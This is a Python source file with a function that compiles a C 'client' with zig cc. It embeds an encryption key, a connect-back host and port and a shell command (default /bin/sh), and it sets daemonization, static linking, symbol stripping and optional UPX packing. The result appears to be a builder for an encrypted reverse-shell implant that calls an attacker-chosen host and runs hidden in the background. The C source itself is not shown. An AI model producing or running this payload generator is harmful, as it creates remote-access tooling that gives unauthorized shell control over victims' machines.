import asyncio
import logging
from asyncio.subprocess import create_subprocess_exec
from datetime import datetime
from pathlib import Path
from tempfile import TemporaryDirectory

import anyio

CLIENT_SOURCE = Path(__file__).parent / "client.c"


logger = logging.getLogger(__name__)


def _c_string_escape(s: str) -> str:
    return '"{}"'.format(
        "".join(
            c
            if c.isascii() and c not in ('"', "\\")
            else "".join(f"\\x{b:02x}" for b in c.encode())
            for c in s
        )
    )


def _c_char_array_escape(s: bytes) -> str:
    return "(char[]) {{ {} }}".format(", ".join(map(str, s)))


async def compile_client(
    encryption_key: str,
    host: tuple[str, int],
    target_arch: str = "x86_64",
    shell_command: str = "/bin/sh",
    buffer_length: int = 1024,
    upx: bool = False,
    compiler_extra_args: tuple[str, ...] = ("-flto", "-Oz", "-s", "-static"),
):
    if not encryption_key.isascii():
        raise ValueError("Encryption key must be ASCII")

    hostname, port = host

    defines = {
        "ENCRYPTION_KEY": _c_char_array_escape(encryption_key.encode()),
        "CONNECT_HOST": _c_string_escape(hostname),
        "CONNECT_PORT": port,
        "SHELL_COMMAND": _c_string_escape(shell_command),
        "BUFFER_LENGTH": buffer_length,
        "DAEMONIZE": 1,
    }

    start_time = datetime.now()

    with TemporaryDirectory() as temp_dir:
        client_binary = Path(temp_dir) / "client"

        result = await create_subprocess_exec(
            *["zig", "cc", f"--target={target_arch}-linux-musl"],
            *[f"-D{key}={value}" for key, value in defines.items()],
            *["-o", client_binary, *compiler_extra_args],
            CLIENT_SOURCE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        _, stderr = await result.communicate()
        if result.returncode:
            logger.error(
                "Compiler exited with code %d: %s",
                result.returncode,
                stderr.decode(errors="ignore").strip(),
            )
            raise RuntimeError("Compiler exited with non-zero code", result.returncode)

        file_size = client_binary.stat().st_size
        logger.debug("Client compiled: %s (%d bytes)", client_binary, file_size)

        if upx:
            result = await create_subprocess_exec(
                "upx",
                "--best",
                client_binary,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            _, stderr = await result.communicate()

            if result.returncode:
                logger.error(
                    "UPX exited with code %d: %s",
                    result.returncode,
                    stderr.decode(errors="ignore").strip(),
                )
                raise RuntimeError("UPX exited with non-zero code", result.returncode)

            compressed_size = client_binary.stat().st_size
            logger.debug(
                "Client compressed: %s (%d bytes, %.2f%%)",
                client_binary,
                compressed_size,
                (compressed_size / file_size) * 100,
            )

        async with await anyio.open_file(client_binary, "rb") as f:
            result = await f.read()

    logger.info(
        "Client compiled in %s, size: %d bytes",
        datetime.now() - start_time,
        len(result),
    )
    return result
